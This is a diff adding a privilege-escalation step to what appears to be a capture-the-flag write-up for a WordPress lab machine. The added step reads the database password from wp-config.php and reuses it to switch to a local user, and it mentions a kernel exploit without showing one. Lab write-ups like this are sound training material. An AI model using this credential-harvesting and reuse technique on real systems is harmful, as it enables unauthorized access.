@@ -96,5 +96,36 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+### 4.Privilege Escalation
+
+Check `wp-config.php` file to find the database password :
+
+```bash
+define( 'DB_USER', 'wordpress' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
+```
+
+when i connect to mysql there is no new user in `wp_users` table, but the password `lolyisabeautifulgirl` can be used to change user to loly :
+
+```bash
+www-data@ubuntu:~/html/wordpress$ su loly
+Password: 
+loly@ubuntu:/var/www/html/wordpress$ cd /home
+```
+
+then i enumerated afew things that led to nothing, but a kernel exploit can be used :
+
+```bash
+loly@ubuntu: uname -a
+```
+
+
+
+
+
+
+
 
 
